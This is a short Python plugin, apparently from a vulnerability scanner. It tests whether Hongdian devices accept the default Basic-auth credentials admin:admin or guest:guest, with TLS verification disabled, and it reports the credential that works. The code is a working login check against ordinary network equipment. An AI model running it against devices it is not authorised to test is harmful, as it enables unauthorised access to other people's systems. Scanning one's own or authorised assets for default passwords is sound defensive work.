#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '宏电默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def base64Str(n):
  import base64
  base64str = str(base64.b64encode(n.encode('utf-8'))).lstrip("b'").rstrip("'")
  return base64str
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/'
  admin = base64Str("admin:admin")
  guest = base64Str("guest:guest")
  url1 = url + target
  ret['url'] = url1
  try:
    headers['Authorization'] = f'Basic {admin}'
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 200 and 'status_main.cgi' in res.text and 'text/html' in res.headers['content-type']:
      ret['huixian'] = "admin:admin"
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    headers['Authorization'] = f'Basic {guest}'
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and 'status_main.cgi' in res.text and 'text/html' in res.headers['content-type']:
      ret['huixian'] = "guest:guest"
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret